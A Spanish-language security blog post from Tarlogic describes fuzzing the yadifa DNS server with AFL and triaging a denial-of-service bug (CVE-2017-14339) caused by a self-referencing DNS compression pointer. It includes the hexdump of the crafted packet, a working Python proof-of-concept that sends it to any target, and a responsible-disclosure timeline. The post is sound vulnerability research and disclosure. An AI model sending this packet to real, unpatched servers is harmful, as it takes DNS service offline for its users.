=== Content from www.tarlogic.com_cf31751f_20250125_183542.html ===


* [Inicio](https://www.tarlogic.com/es/)
* [Servicios](https://www.tarlogic.com/es/servicios-ciberseguridad/ "Servicios de ciberseguridad")
  + Servicios de tests de intrusion avanzados
    - [Red Team](https://www.tarlogic.com/es/servicios-red-team/ "Servicios de Red Team")
    - [Pentesting interno y externo](https://www.tarlogic.com/es/pentesting/ "servicios de tests de intrusión")
    - [Test de ingeniería social](https://www.tarlogic.com/es/ingenieria-social/ "servicios de Ingeniería social y phishing")
    - [Pentesting WiFi](https://www.tarlogic.com/es/auditoria-seguridad-wifi/ "servicio de pentest WiFi")
    - Servicios de ciberinteligencia
    - [Vigilancia digital](https://www.tarlogic.com/es/vigilancia-digital/)
    - [Threat Intelligence](https://www.tarlogic.com/es/threat-intelligence/ "Inteligencia de amenazas")
    - [Investigación y análisis de fraude](https://www.tarlogic.com/es/investigacion-y-analisis-de-fraude/ "Análisis de fraude")
    - [Ciberinteligencia estratégica](https://www.tarlogic.com/es/ciberinteligencia-estrategica/ "Inteligencia estratégica")
  + Servicios de auditoria de seguridad
    - [Auditoría de seguridad web](https://www.tarlogic.com/es/auditoria-seguridad-web/)
    - [Auditoría de seguridad de aplicaciones móviles](https://www.tarlogic.com/es/auditoria-aplicaciones-moviles/ "Auditoría de aplicaciones móviles")
    - [Auditoría de seguridad IOT](https://www.tarlogic.com/es/auditoria-seguridad-iot/)
    - [Auditoría de Seguridad de infraestructuras en la nube](https://www.tarlogic.com/es/auditoria-seguridad-cloud/ "Auditoría de seguridad cloud")
    - [Auditoría de código fuente](https://www.tarlogic.com/es/auditoria-codigo-fuente/ "Auditoría de código")
    - [Servicios de ingeniería inversa y hardware hacking](https://www.tarlogic.com/es/hardware-hacking-ingenieria-inversa/ "Ingeniería inversa y hardware hacking")
    - [Bastionado de sistemas operativos y tecnologías](https://www.tarlogic.com/es/bastionado-sistemas-hardening/ "Bastionado")
    - [Auditoría de seguridad en entornos bancarios avanzados](https://www.tarlogic.com/es/auditoria-seguridad-entornos-bancarios/ "seguridad banca")
  + Reduccion de superficie de ataque
    - [Gestión de vulnerabilidades](https://www.tarlogic.com/es/gestion-vulnerabilidades/ "Servicio de gestión de vulnerabilidades")
    - [vulnerabilidades emergentes 24×7](https://www.tarlogic.com/es/vulnerabilidades-emergentes/ "servicio de vulnerabilidades emergentes")
    - [Pruebas de denegación de servicio (DoS)](https://www.tarlogic.com/es/dos-test/ "Pruebas DoS")
    - [Programas de Bug Bounty](https://www.tarlogic.com/es/bug-bounty/ "Gestión de programas de Bug Bounty")
    - [Riesgo dinámico y Priorización de Amenazas](https://www.tarlogic.com/es/priorizacion-amenazas/ "Priorización de amenazas")
    - Proteccion y respuesta
    - [Servicios de Threat Hunting](https://www.tarlogic.com/es/threat-hunting/)
    - [Servicios de Respuesta ante Incidentes](https://www.tarlogic.com/es/respuesta-incidentes/ "Respuesta ante Incidentes")
* [BlackArrow](https://www.tarlogic.com/es/blackarrow/)
* [Blog](https://www.tarlogic.com/es/blog/ "Blog Ciberseguridad")
* [Contacto](https://www.tarlogic.com/es/contacto/ "Contactar con tarlogic")
* [ES](https://www.tarlogic.com/es/blog/fuzzing-yadifa-dns/ "ES")
  + [EN](https://www.tarlogic.com/blog/fuzzing-tales-0x01-yadifa-dns/ "EN")

* ES
  + [EN](https://www.tarlogic.com/blog/fuzzing-tales-0x01-yadifa-dns/)

![Cabecera blog ciberseguridad](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_blur.jpg)

[Inicio](https://www.tarlogic.com/es/)
/
[Blog](https://www.tarlogic.com/es/blog/)
/
Historias de Fuzzing 0x01: Yadifa DNS

# Historias de Fuzzing 0x01: Yadifa DNS

19 - Sep - 2017
- Javier Gil

Tabla de contenidos

* [1. Estudio y adaptación del código fuente para optimizar el funcionamiento de AFL](#1_Estudio_y_adaptacion_del_codigo_fuente_para_optimizar_el_funcionamiento_de_AFL "1. Estudio y adaptación del código fuente para optimizar el funcionamiento de AFL")
* [2. Preparación del entorno para AFL y ejecución](#2_Preparacion_del_entorno_para_AFL_y_ejecucion "2. Preparación del entorno para AFL y ejecución")
* [3. Breve descripción del protocolo DNS](#3_Breve_descripcion_del_protocolo_DNS "3. Breve descripción del protocolo DNS")
* [4. Triage de un «hang»](#4_Triage_de_un_%C2%ABhang%C2%BB "4. Triage de un «hang»")

Parte de la [actividad del RedTeam](https://www.tarlogic.com/es/servicios-red-team/) de Tarlogic consiste en la búsqueda de vulnerabilidades en [software que pueda ser usado por nuestros clientes](https://www.tarlogic.com/es/blog/rce-en-cobian-backup-11/) . En esta ocasión, vamos a describir el proceso de adaptación y fuzzing del servidor DNS yadifa 2.2.5, así como el triage de un bug encontrado en el mismo (DoS, [CVE-2017-14399](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14339))

Este post se compone de varios apartados:

1. Estudio y adaptación del código fuente para optimizar el funcionamiento de AFL
2. Preparación del entorno para AFL y ejecución
3. Breve descripción del protocolo DNS
4. Triage de un «hang»

## 1. Estudio y adaptación del código fuente para optimizar el funcionamiento de AFL

Uno de los servidores que hemos fuzzeado es [yadifa](https://www.yadifa.eu/). Se trata de un servidor DNS de alto rendimiento basado en multithreading, desarrollado por EURid. Yadifa está diseñado de manera que tiene varios thread-pools encargados de diversas tareas. Por ejemplo, existe un pool que se encarga de la recepción de peticiones DNS, al igual que existe otro encargado de procesarlas y enviar la respuesta al cliente. Este no es el mejor caso para fuzzear con AFL, pero podemos tratar de adaptar el código de manera que el procesado sea más lineal. Esto tiene la ventaja de que mejora enormemente la velocidad y la precisión, pero como inconveniente hay que destacar que estamos perdiendo cobertura de aspectos que pueden ser importantes:

* ¿La sincronización entre hilos es correcta? ¿Existen race-conditions? ¿Use-after-free provocados por mala sincronización?
* Es posible que al desactivar componentes del servidor haya variables que no estén inicializadas. Esto puede causar que obtengamos falsos positivos en forma de crashes que no son válidos en la versión no modificada del software, o que perdamos cobertura de zonas de código que dependen del componente desactivado.

De todos modos, como exploración inicial, es un trade-off aceptable.

Comencemos a indagar en el código de yadifa. El punto más evidente para partir es la función main(), ubicada en [sbin/yadifad/main.c](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/main.c#L522). Podemos ver que consiste en una serie de inicializaciones, seguidas del lanzamiento de varios «servicios». Un servicio, según vemos más adelante, es un thread-pool que procesa tareas de un tipo determinado.

De cara a fuzzear con AFL hay aspectos del programa que no nos interesan, como pueden ser la comprobación de que el servidor no se encuentre ya en ejecución o la inicialización de jaulas chroot. Por tanto, comentaremos las líneas 573 a 576, así como 595 a 598. El servicio de notificaciones entre componentes de yadifa tampoco nos interesa, ya que nuestro objetivo es lograr que el servidor procese varios miles de peticiones DNS leídas desde stdin y posteriormente finalize su ejecución. De este modo podremos utilizar el modo persistente de AFL y agilizar en gran medida el proceso. Por tanto, comentaremos la línea 635.

Finalmente, vemos que la función main() llama a server\_service\_start\_and\_wait() y posteriormente finaliza.

server\_service\_start\_and\_wait() se encuentra en el archivo [sbin/yadifad/server.c, línea 1026](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/server.c#L1026)

Es una función pequeña, que únicamente llama a service\_start\_and\_wait(), asegurándose de que el servicio no se encuentre previamente en ejecución. service\_start\_and\_wait() se encuentra en [lib/dnscore/src/service.c](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/lib/dnscore/src/service.c#L452). A su vez, esta función llamará a service\_start(), seguido de service\_wait().

Dichas funciones se encuentran en el mismo archivo de código. La función de service\_start es iniciar tantos hilos como estén configurados en el servicio. service\_wait espera a que todos ellos hayan finalizado.

La función de entrada de los hilos es service\_thread(), de nuevo en el mismo archivo. En resumen, tras inicializar varios parámetros de control, llama a la función de entrada especificada en la definición del servicio.

Ahora bien, ¿qué funciones corre este servicio? service\_start\_and\_wait() pasa como parámetro a service\_start() la variable server\_service\_handler. Esta variable se encuentra definida en sbin/yadifad/server.c, y es una variable global inicializada con el valor UNINITIALIZED\_SERVICE. En el mismo archivo se encuentra la función [server\_service\_init()](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/server.c#L988), llamada desde main(). Esta función llama a

```
service_init_ex(&server_service_handler, server_service_main, "server", 1).
```

[service\_init\_ex() se encuentra en service.c](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/lib/dnscore/src/service.c#L243) y se encarga de asignar diversos valores a los campos de la estructura que representa el servicio. El campo que más nos interesa ahora mismo es el punto de entrada, ya que es la función que mencionamos anteriormente, llamada desde service\_thread(). Como vemos en la llamada a service\_init\_ex(), se trata de la función server\_service\_main.

server\_service\_main() se encuentra de nuevo en server.c, y su función es marcar el servicio como «en ejecución», llamar a server\_init() seguido de server\_run(), y a su retorno marcar el servicio como «no en ejecución».

En [server\_run()](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/server.c#L853) podemos ver una serie de inicializaciones del listener TCP. Esto en este momento no nos interesa, así que saltamos directamente a la línea 930, que es una llamada a server\_run\_loop(). [Dicha función se encuentra en server.c](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/server.c#L841) y contiene la línea

```
ya_result ret = server_type[g_config->network_model].loop();
```

La variable server\_type se encuentra definida al principio del mismo archivo:

```
static struct server_desc_s server_type[2] =
{
    {
        server_mt_context_init,
        server_mt_query_loop,
        "multithreaded resolve"
    },
    {
        server_rw_context_init,
        server_rw_query_loop,
        "multithreaded deferred resolve"
    }
};
```

Por lo que, según la configuración del servidor, la función llamada será server\_mt\_query\_loop o server\_rw\_query\_loop. Al azar, escogemos server\_rw\_query\_loop (aunque, en retrospectiva, hubiese sido más simple utilizar server\_mt\_query\_loop).

server\_rw\_query\_loop se encuentra en [sbin/yadifad/server-rw.c](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/server-rw.c#L1046). La parte que nos interesa se encuentra entre las líneas 1167 y 1179. Se trata del encolado de funciones en dos thread-pools:

server-rw-recv -> función [server\_rw\_udp\_receiver\_thread](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/server-rw.c#L189)

server-rw-send -> [función server\_rw\_udp\_sender\_thread](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/server-rw.c#L841)

server\_rw\_udp\_receiver\_thread gestiona la recepción de peticiones DNS. Nada mas empezar podemos ver que soporta tanto el uso de recvmsg() como de recvfrom(). De cara a fuzzear con AFL, nos resulta mucho más comodo utilizar recvfrom(), ya que evitamos tener que gestionar las estructuras que maneja recvmsg(), por lo que ignoraremos las zonas de código entre los «#ifdef UDP\_USE\_MESSAGES». Optar por la variante de recvmsg nos da la comodidad de poder sustituir esta llamada por un simple read() al descriptor 0 (stdin), lo cual es perfecto para nuestros propósitos.

A continuación el mensaje se encola (según carga del servidor, en la «cola directa» o en la «cola aplazada». Los detalles no son relevantes para nuestro objetivo, ya que eliminaremos este código) para su posterior procesado por el hilo que está ejecutando server\_rw\_udp\_sender\_thread. En esta función podemos ver como se desencola una petición DNS de cualquiera de las dos colas, y en cualquier caso se llama a la función [server\_rw\_udp\_sender\_process\_message](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/server-rw.c#L474).

Al fin hemos llegado a la función que nos interesa. Podemos ver que esta función se encarga de procesar el mensaje, llamar a las funciones de la DB de yadifa para buscar resultados, y enviar la respuesta.

Por tanto, después de seguir el código hasta aquí, podemos concluir que el flujo de código lineal que nos interesa es:

main -> server\_rw\_udp\_receiver\_thread -> server\_rw\_udp\_sender\_thread -> server\_rw\_udp\_sender\_process\_message

El siguiente paso es conseguir una versión reducida de las funciones server\_rw\_udp\_\* que nos permita encadenarlas, de manera que obtengamos algo similar a:

```
while(number_of_packets_per_fuzzed_process > 0) {
  server_rw_udp_receive()
    msg = read(stdin)
  server_rw_udp_sender_process_message()
    yadifa magic here -> fuzz it!
  server_rw_udp_send()
    nop
}
```

En la función main() comentaremos las [líneas 655 a 662](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/sbin/yadifad/main.c#L655), sustituyéndolas por:

```
int fin = STDIN_FILENO;

while (__AFL_LOOP(1000)) {
 	message_data *mesg = malloc(sizeof(message_data));
 	memset(mesg, 0, sizeof(message_data));

  server_rw_udp_receiver(fin, mesg);
  server_rw_udp_sender(fin, mesg);

  free(mesg);
}
```

De este modo podemos utilizar el modo persistente de AFL, que nos evitará tener que iniciar un proceso nuevo en cada iteración, aumentando sensiblemente el número de pruebas por segundo.

Después de main() escribiremos la [versión simplificada de las funciones que hemos estudiado anteriormente.](https://gist.github.com/ca0s/1ddd7b0834a0842038b2b8fcf588bd60)

Parte del código es inútil, pero hemos decidido mantener la estructura con el objetivo de facilitar al lector la comparación con el original.

Adicionalmente, necesitaremos incluir la cabecera rrl.h:

```
#include "rrl.h"
```

Con estas modificaciones sólo nos queda compilar el código:

```
CC=afl-clang-fast ./configure && make
```

El binario compilado nos quedará en sbin/yadifad/yadifad

A partir del archivo de configuraciónde ejemplo, preparamos un [archivo de configuración](https://gist.github.com/ca0s/f20aa96ac5acb80cb93e918a26b91ab5). En resumen, evitamos que levante un demonio, haciendo que quede en foreground, desactivamos la jaula chroot, hacemos que escriba en carpetas en las que nuestro usuario pueda leer y escribir, hacemos que corra con nuestro mismo usuario y que el puerto en el que escucha esté por encima de 1024.

Con esto estamos listos para comenzar a fuzzear.

## 2. Preparación del entorno para AFL y ejecución

No vamos a describir el funcionamiento de AFL, ya que existe extensiva documentación al respecto. Simplemente vamos a enumerar los pasos necesarios para comenzar a fuzzear el programa.

En primer lugar, AFL recibe los parámetros -i -o .

Como samples de partida utilizaremos los paquetes disponibles en <https://github.com/CZ-NIC/dns-fuzzing>, descargado por ejemplo en /home/fuzz/yadifa/in
Como carpeta de salida, nos vale cualquiera en la que podamos escribir. Por ejemplo, en /home/fuzz/yadifa/out

Es necesario, por supuesto, haber creado cualquier ruta o archivo de los que pueda depender el programa fuzzeado. Según la configuración:

```
mkdir -p /tmp/zones/keys
mkdir -p /tmp/zones/xfr
mkdir -p /tmp/yadifa/logs
```

Por tanto,

```
afl-fuzz -i /home/fuzz/yadifa/in -o /home/fuzz/yadifa/out /home/fuzz/yadifa/yadifa-2.2.5-6937/sbin/yadifad/yadifad -c /home/fuzz/yadifa/yadifad.conf
```

Si todo ha ido bien, deberíamos ver la interfaz de AFL. En una máquina virtual con un sólo core de un i7, la velocidad estaba en unos 14k/s. En un periodo de tiempo bastante reducido pudimos observar varios «hangs».

## 3. Breve descripción del protocolo DNS

Antes de explicar la causa del bug detectado es necesario conocer parte del funcionamiento del protocolo DNS. Si tienes fresco esto, puedes pasar directamente al siguiente apartado.

Desde muy alto nivel, DNS es un protocolo que puede funcionar tanto sobre TCP como UDP, aunque lo más común es utilizar UDP para peticiones estándar y TCP para asuntos concretos como puede
ser una transferencia de zona. Se trata de un protocolo relativamente simple, en el que el cliente envía una petición al servidor, y este envía una única respuesta. El servidor puede devolver la respuesta inmediatamente si tiene información sobre los hosts sobre los que se le ha preguntado, o a su vez reenviar la petición a otro servidor, el cual espera esté en posesión de la información. A esto se le llama una petición recursiva.

Los tamaños máximos definido por el RFC 1035 son:

* FQDN: 255 bytes, formado por varias etiquetas. Ejemplo: www.ka0labs.
* Etiqueta: 63 bytes. Ejemplo:
* Paquete UDP: 512 bytes

Un paquete DNS está compuesto de los siguientes elementos (todos los diagramas ASCII están copiados directamente del [RFC](https://www.ietf.org/rfc/rfc1035.txt):

```
    +---------------------+
    |        Header       |
    +---------------------+
    |       Question      | nombres sobre los que el cliente pregunta
    +---------------------+
    |        Answer       | RRs de respuesta a la pregunta
    +---------------------+
    |      Authority      | RRs que indican el servidor autoritativo para los nombres por los que el cliente pregunta
    +---------------------+
    |      Additional     | RRs con información adicional
    +---------------------+
```

Un RR es un Resource Record, un registro de información. Existen varios tipos de RR (A para direcciones IPv4, AAAA para direcciones IPv6, MX para servidores de correo, etc).

La cabecera tiene el siguiente aspecto:

```
                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

Explicaremos los campos más relevantes:

ID es un identificador que escoge el cliente y debe ser copiado tal cual en la respuesta. QR indica si el mensaje es una pregunta o respuesta, según si su valor es 0 o 1.
Opcode es el tipo de petición, escogido por el cliente. El tipo que nos interesa es el valor 0, «standard query».
QDCOUNT, ANCOUNT, NSCOUNT y ARCOUNT son el número de RRs en las secciónes Question, Answer, Authority, y Additional, en ese orden.

Tras la cabecera vienen una o más secciones Question, con el siguente formato:

```
                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                     QNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     QTYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     QCLASS                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

Donde QNAME es una sucesión de etiquetas que forman un nombre. Una etiqueta está formada por un byte que indica la longitud del texto que la forma, seguido de dicho texto. Por ejemplo, una etiqueta que contenga el texto «tarlogic» sería «\x08tarlogic»

QTYPE es el tipo de registro por el que se pregunta (A, AAAA, MX, TXT, PTR, SOA, …)

QCLASS es el tipo de recurso por el que se pregunta. Hoy en día solo se utiliza el valor IN (Inet).

El resto de secciones están compuestos por uno o más RR, con el siguiente formato:

```
                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

Donde NAME, TYPE y CLASS son equivalentes a los campos QNAME, QTYPE y QCLASS descritos anteriormente. TTL es el tiempo máximo que el resultado debe ser almacenado en la caché de los clientes y servidores intermedios por los que pueda pasar la respuesta. RDLENGTH es la longitud en bytes del campo de longitud variable RDATA. RDATA tiene distintos formatos, según el valor del campo TYPE. Son numerosos, por lo que no vamos a describirlos en este texto.

Cabe mencionar (dado que es clave para el siguiente apartado, \*guiño\*) que DNS se diseñó en una época en la que internet no funcionaba a la misma velocidad que hoy, por lo que se realizaban esfuerzos por reducir el tamaño de los mensajes a enviar siempre que se podía. En DNS se diseñó un mecanismo de compresión en los nombres contenidos en los paquetes.

Ya hemos explicado que un nombre está formado por una serie de etiquetas, que a su vez están formadas por un byte que representa la longitud de la misma (sin contar el propio byte) seguido del texto, con una longitud máxima de 63 bytes (hexadecimal 0x3F, binario 00111111). El mecanismo de compresión diseñado para DNS consiste en reutilizar partes de nombres que ya se encuentren en el paquete, en lugar de repetirlos. Para esto, una etiqueta puede tomar la forma de un puntero o referencia.

Si el byte de longitud de la etiqueta tiene los dos primeros bits con valor 1 (por tanto, un valor mayor a 63 o 0x3f), se trata de un puntero. Esto puede detectarse con una simple operación AND con el valor 0xC0. Este valor indica que el resto de bits de dicho byte junto al valor del siguiente byte forman una posición desde el comienzo del paquete desde el cual se debe continuar la lectura del nombre. El desplazamiento se calcula de la siguiente manera:

```
char *reference = &msg[x];
char *offset = ((*reference & 0x3F) << 8) | *(reference + 1) // 0x3F = 0b00111111
```

Con esto tenemos suficiente para continuar.

## 4. Triage de un «hang»

Un hang de AFL es un sample que hace que el programa fuzzeado tarde más de la cuenta en procesarlo. Esto puede ser indicativo de varios problemas, entre otros:

* Loops infinitos o demasiado extensos
* Consumo excesivo de recursos (escrituras a disco, uso de memoria)
* Bloqueos entre hilos

Tras fuzzear yadifa durante unos minutos, AFL nos reportó varios hangs. Tras reproducir uno de ellos en una versión no modificada de yadifa, determinamos que el fallo podía ser real (y no causado por alguna de nuestras modificaciones en la etapa de hacer chopped con el código), ya que tras enviar el paquete en cuestión varias veces el servidor dejaba de responder y el uso de CPU era elevado.

Compilamos nuestra versión modificada de la siguiente manera:

```
CFLAGS="-g -O0" ./configure && make
```

De modo que tenemos símbolos de depuración y el código generado por el compilador debería ser entendible.

Ejecutamos

```
gdb yadifad
```

Y la instrucción:

```
run -c yadifad.conf < dos.pkt
```

Donde dos.pkt contiene el sample generado por AFL en out/hangs/

Observamos que pasados unos segundos de ejecución del programa no parece haber respuesta. Con la secuencia Control+C paramos el proceso, y observamos el estado en el depurador:

[![Estado del proceso de yadifa DNS](data:image/gif;base64...)](https://www.tarlogic.com/wp-content/uploads/2017/09/dns-fuzzing.png)

Estado del proceso de yadifa DNS

Nos encontramos en la función [packet\_reader\_read\_fqdn](https://github.com/yadifa/yadifa/blob/62c5a825ff2beaa63080ce5045a2b5c5c5c867e9/lib/dnscore/src/packet_reader.c#L61), en el archivo lib/dnscore/src/packet\_reader.c, línea 125.

Vemos que la instrucción en la que hemos parado el depurador se encuentra dentro de un bucle for(;;). Las líneas son las siguientes:

```
...
for(;;)
{
    u8 len = *p++;

    if((len & 0xc0) == 0xc0) /* EDF: better yet: cmp len, 192; jge  */
    {
        /* reposition the pointer */
        u32 new_offset = len & 0x3f;
        new_offset   <<= 8; new_offset |= *p; p = &reader->packet[new_offset];

        continue;
    }
    ...
```

Observamos la operación AND con el valor 0xC0, seguida de un cálculo de offset utilizando la constante 0x3F, con un desplazamiento << 8. ¿Nos suena de algo? Estamos en el código encargado
de procesar referencias en etiquetas.

Estudiando ese pequeño trozo de código podemos ver que existe la posibilidad de entrar en un bucle infinito, dado que el algoritmo que utilizan simplemente mueve el puntero de lectura a la posición indicada por la referencia, sin comprobar que sea un valor distinto a la posición actual o que ya se hayan realizado un número de saltos anteriormente por encima de algún límite establecido.

El paquete que causa la iteración infinita sobre el bucle es el siguiente:

```
00000000: 3132 0000 0001 0000 0000 0101 0a6b 6130  12...........ka0
00000010: 6c61 6273 2d00 0100 000e 1000 0603 6e73  labs-.........ns
00000020: 36c0 0cc0 2300                           6...#.
```

En la posición 0x23 podemos observar el byte 0xC0, seguido del valor 0x23. Esta referencia, una vez resuelta, hará que el parser salte de nuevo a la posición 0x23 del paquete, repitiendo de nuevo la misma operación una y otra vez.

Según el número de hilos corriendo en el pool del servicio que se encarga de procesar paquetes, será necesario enviar un número mayor o menor de paquetes para hacer que el servidor deje de responder. Cada paquete enviado hará que uno de los hilos que estén libres quede bloqueado en este bucle. Un código simple a modo de PoC es el siguiente:

```
# Yadifa DoS PoC
# Discovered by: Javier Gil (@ca0s_) & Juan Manuel Fernandez (@TheXC3LL)

import socket
import sys

if __name__ == '__main__':
        if len(sys.argv) < 2: print "Usage: %s IP [PORT]" % (sys.argv[0], ) sys.exit(-1) IP = sys.argv[1] if len(sys.argv) >= 3:
                PORT = int(sys.argv[2])
        else:
                PORT = 53

        exploit = "3132000000010000000001010a6b61306c6162732d000100000e100006036e7336c00cc02300"
        print "[+] Yadifa DoS PoC"
        print "[+] Sending packet..."

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
        sock.sendto(exploit.decode("hex"), (IP, PORT))

        print "[+] Sent!"
```

Este bug fue reportado a EURid y ya se cuenta con un parche. El timeline es el siguiente:

01/09/2017 – Contacto inicial con el equipo de seguridad de EURid y descripción del bug, siguiendo una estricta política de FD (Friday Disclosure)
01/09/2017 – Respuesta del equipo de EURid, pase de información al equipo de desarrollo.
04/09/2017 – Envío de PoC a EURid.
08/09/2017 – El equipo de desarrollo reproduce el bug y comienza a trabajar en un parche.
11/09/2017 – Contacto con MITRE
12/09/2017 – Asignación de CVE-2017-14339
13/09/2017 – Release de yadifa 2.2.6 con el bug corregido

Descubre nuestro trabajo y nuestros [servicios de ciberseguridad](https://www.tarlogic.com/es/servicios-ciberseguridad/) en [www.tarlogic.com/es/](https://www.tarlogic.com/es/)

En [TarlogicTeo](https://www.google.com/maps/place//data%3D%214m2%213m1%211s0xd2f01a1345c744d%3A0x4e2c1843c02c7270?source=g.page.share) y en [TarlogicMadrid](https://www.google.com/maps/place//data%3D%214m2%213m1%211s0xd422bfea221b7ff%3A0xd28a426a9e3af458?source=g.page.share).

compartir este artículo

[Facebook](https://www.facebook.com/sharer.php?u=https://www.tarlogic.com/es/blog/fuzzing-yadifa-dns/) -
[Twitter](https://x.com/share?text=Historias de Fuzzing 0x01: Yadifa DNS&url=https://www.tarlogic.com/es/blog/fuzzing-yadifa-dns/) -
[Linkedin](https://www.linkedin.com/shareArticle?mini=true&url=https://www.tarlogic.com/es/blog/fuzzing-yadifa-dns/&title=Historias de Fuzzing 0x01: Yadifa DNS&summary=Describimos el proceso de analisis y fuzzing del servidor DNS Yadifa y el triage de una vulnerabilidad encontrada en el mismo.)

##### Entradas relacionadas

[![Arecibo: Una herramienta de exfiltración OOB (DNS & HTTP)](data:image/gif;base64...)](https://www.tarlogic.com/es/blog/arecibo-exfiltracion-tool/)
###### [Arecibo: Una herramienta de exfiltración OOB (DNS & HTTP)](https://www.tarlogic.com/es/blog/arecibo-exfiltracion-tool/)

09 - noviembre - 2018
Juan Manuel Fernandez

[Leer más](https://www.tarlogic.com/es/blog/arecibo-exfiltracion-tool/)

[![Vulnerabilidades en Ampache (<=3.9.1)](data:image/gif;base64...)](https://www.tarlogic.com/es/blog/vulnerabilidades-en-ampache/)
###### [Vulnerabilidades en Ampache (<=3.9.1)](https://www.tarlogic.com/es/blog/vulnerabilidades-en-ampache/)

21 - agosto - 2019
Pablo Martinez

[Leer más](https://www.tarlogic.com/es/blog/vulnerabilidades-en-ampache/)

[![Vulnerabilidad Spring4Shell – CVE-2022-22965 y CVE-2022-22963](data:image/gif;base64...)](https://www.tarlogic.com/es/blog/vulnerabilidad-spring4shell-cve-2022-22965/)
###### [Vulnerabilidad Spring4Shell – CVE-2022-22965 y CVE-2022-22963](https://www.tarlogic.com/es/blog/vulnerabilidad-spring4shell-cve-2022-22965/)

01 - abril - 2022
Nico Matovelle, Óscar Mallo, Jose Rabal

[Leer más](https://www.tarlogic.com/es/blog/vulnerabilidad-spring4shell-cve-2022-22965/)

## ¿Podemos ayudarle en algo?

Contacte con nuestro equipo de ciberseguridad para cualquier pregunta o asesoramiento

[Contacto](https://www.tarlogic.com/es/contacto/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/tarlogic-cybersecurity-company-footer_blur.webp)

###### UNIDADES DE NEGOCIO

* [CIBERSEGURIDAD](https://www.tarlogic.com/es/servicios-ciberseguridad/ "SERVICIOS DE CIBERSEGURIDAD")
* [CIBERINTELIGENCIA](https://www.tarlogic.com/es/ciberinteligencia/ "SERVICIOS DE CIBERINTELIGENCIA")
* [BLACKARROW](https://www.tarlogic.com/es/blackarrow/ "SERVICIOS DE BLACKARROW")

###### INFORMACIÓN DE CONTACTO

[Santiago de Compostela
 Travesía do Montouto Nº1,
 Teo, A Coruña.
 C.P.15894](https://www.google.com/maps?cid=5632903913199661680)
 (+34) 912 919 319

 contacto@tarlogic.com
[Madrid
 Calle Quintanavides 13-23,
 Parque empresarial Vía Norte edificio 2,
 Las Tablas, 28050](https://www.google.com/maps?cid=15171011320439567448)

###### ENLACES

* [Productos Ciberseguridad](https://www.tarlogic.com/es/productos/)
* [Empleo ciberseguridad](https://www.tarlogic.com/es/empleo-ciberseguridad/)
* [Empresa ciberseguridad (Nosotros)](https://www.tarlogic.com/es/sobre-tarlogic/)
* [Últimas novedades](https://www.tarlogic.com/es/actualidad/)
* [Glosario de ciberseguridad](https://www.tarlogic.com/es/glosario-ciberseguridad/)
* [BSAM Metodología seguridad Bluetooth](https://www.tarlogic.com/bsam/es/)
* [Sectores](https://www.tarlogic.com/es/sectores/)
* [Canal de partners](https://www.tarlogic.com/es/partners/)

© 2025 Todos los derechos reservados Tarlogic Security | Expertos en ciberseguridad y ciberinteligencia

